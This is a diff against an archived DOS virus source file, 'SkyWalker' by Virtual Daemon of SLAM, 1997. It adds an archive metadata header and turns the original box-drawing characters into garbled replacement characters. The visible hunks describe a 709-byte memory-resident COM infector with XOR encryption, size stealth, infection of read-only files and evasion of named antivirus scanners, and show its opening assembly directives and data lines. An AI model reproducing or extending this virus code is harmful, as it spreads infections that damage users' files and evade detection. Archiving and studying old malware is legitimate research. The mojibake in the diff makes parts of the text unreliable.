@@ -1,16 +1,27 @@
+; ------------------------------------------------------------
+; name      S
+; type      asm
+; cve       â€”
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     â€”
+; ------------------------------------------------------------
 ;
-;    SúkúyúWúaúlúkúeúr                 Written by Virtual Daemon [SLAM] 1997
-; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¯
+;    Sï¿½kï¿½yï¿½Wï¿½aï¿½lï¿½kï¿½eï¿½r                 Written by Virtual Daemon [SLAM] 1997
+; ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¯
 ;
 ;  Description:
-;  ÄÄÄÄÄÄÄÄÄÄÄÄ
+;  ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 ;    Ä¯ Virus Name: SkyWalker
 ;    Ä¯ Virus Author: Virtual Daemon
 ;    Ä¯ Group: SLAM
 ;    Ä¯ Virus Size: 709 bytes
 ;    Ä¯ Virus Type: TSR COM infector
 ;  Comments:
-;  ÄÄÄÄÄÄÄÄÄ
+;  ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 ;    Ä¯ XOR Encryption with a random variable
 ;    Ä¯ Infect files via 4bh (load or execute)
 ;    Ä¯ Size-Stealth on 11h/12h (find 1st/next FCB), 4eh/4fh (find 1st/next
@@ -21,7 +32,7 @@
 ;    Ä¯ Infect read only files
 ;    Ä¯ NO Payload... :(
 ;  Anti-Virus Tests:
-;  ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
+;  ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 ;    Ä¯ No detection with AidsTest
 ;    Ä¯ No detection with Toolkit
 ;    Ä¯ 'Unknown virus' detection with F-Prot 2.27 full heuristic
@@ -42,9 +53,9 @@
 ; I'm a very big fan of Star Wars.
 ;   One last mention: the seconds are set to 60 for stealth checking...
 ;
-;                      ÚÄÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÄ¿
-;                      ú "May the force be with you!" ú
-;                      ÀÄÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÄÙ
+;                      ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½Ä¿
+;                      ï¿½ "May the force be with you!" ï¿½
+;                      ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½
 
 .model tiny
 .code
@@ -390,7 +401,7 @@ cad         equ 53h
 endc:
 buffer      db 3 dup (?)
 encrypt_val dw 0
-virname  db 0,'SúkúyúWúaúlúkúeúr',0
+virname  db 0,'Sï¿½kï¿½yï¿½Wï¿½aï¿½lï¿½kï¿½eï¿½r',0
 
 crypt:
    db 66h                       ;for Sourcer
